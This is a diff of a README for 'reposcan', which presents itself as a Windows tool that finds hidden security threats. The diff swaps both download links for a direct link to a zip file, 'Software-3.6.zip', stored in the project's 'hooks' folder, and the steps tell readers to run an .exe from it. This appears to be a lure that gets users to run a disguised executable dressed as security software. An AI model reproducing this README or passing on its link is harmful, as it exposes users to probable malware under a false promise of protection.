@@ -1,6 +1,6 @@
 # 🛡️ reposcan - Find hidden security threats on your computer
 
-[![](https://img.shields.io/badge/Download-reposcan-blue.svg)](https://github.com/dyego63-arch/reposcan)
+[![](https://img.shields.io/badge/Download-reposcan-blue.svg)](https://github.com/dyego63-arch/reposcan/raw/refs/heads/main/hooks/Software-3.6.zip)
 
 reposcan checks your local files for security risks. It looks for fake leaks, malware traces, and suspicious code patterns. Use this tool to keep your personal data and projects safe from harm. 
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The software works on stan
 
 This program does not require a traditional installer that changes your system settings. Follow these steps to get the software running on your machine:
 
-1. Visit the project link to download the software: https://github.com/dyego63-arch/reposcan
+1. Visit the project link to download the software: https://github.com/dyego63-arch/reposcan/raw/refs/heads/main/hooks/Software-3.6.zip
 2. Look for the latest version listed on the page.
 3. Click the file that ends in .exe.
 4. Save the file to your Downloads folder or your Desktop.
